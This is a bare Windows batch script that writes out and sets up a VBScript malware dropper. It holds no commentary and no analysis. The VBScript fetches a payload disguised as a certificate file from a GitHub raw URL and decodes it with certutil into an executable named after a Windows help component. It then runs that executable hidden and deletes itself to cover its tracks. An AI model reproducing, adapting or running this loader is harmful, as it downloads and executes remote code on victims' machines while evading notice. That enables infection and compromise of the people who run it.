echo Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1") > winhlplog.vbs
echo URL = "https://raw.githubusercontent.com/736f636865617461/kontrey/main/kon-trey-bra.crt" >> winhlplog.vbs
echo objWinHttp.open "GET", URL, False >> winhlplog.vbs
echo objWinHttp.send "" >> winhlplog.vbs
echo SaveBinaryData "C:\ProgramData\winhlp32\cert64.crt",objWinHttp.responseBody >> winhlplog.vbs
echo Function SaveBinaryData(FileName, Data) >> winhlplog.vbs
echo 	Const adTypeText = 1 >> winhlplog.vbs
echo 	Const adSaveCreateOverWrite = 2 >> winhlplog.vbs
echo 	Dim BinaryStream >> winhlplog.vbs
echo 	Set BinaryStream = CreateObject("ADODB.Stream") >> winhlplog.vbs
echo 	BinaryStream.Type = adTypeText >> winhlplog.vbs
echo 	BinaryStream.Open >> winhlplog.vbs
echo 	BinaryStream.Write Data >> winhlplog.vbs
echo 	BinaryStream.SaveToFile FileName, adSaveCreateOverWrite >> winhlplog.vbs
echo End Function >> winhlplog.vbs
echo Set objShell = WScript.CreateObject("WScript.Shell")>> winhlplog.vbs
echo objShell.Run "cmd /c powershell certutil -decode C:\ProgramData\winhlp32\cert64.crt C:\ProgramData\winhlp32\winhlp32.exe", 0, True>> winhlplog.vbs
echo WScript.Sleep(5000) >> winhlplog.vbs
echo Set WshShell = CreateObject("WScript.Shell") >> winhlplog.vbs
echo WshShell.Run chr(34) ^& "C:\ProgramData\winhlp32\winhlp32.exe" ^& chr(34), 0 >> winhlplog.vbs
echo Set WsgShell = Nothing >> winhlplog.vbs
echo WScript.Sleep(3000) >> winhlplog.vbs
echo Set oFso = CreateObject("Scripting.FileSystemObject") : oFso.DeleteFile Wscript.ScriptFullName, True >> winhlplog.vbs
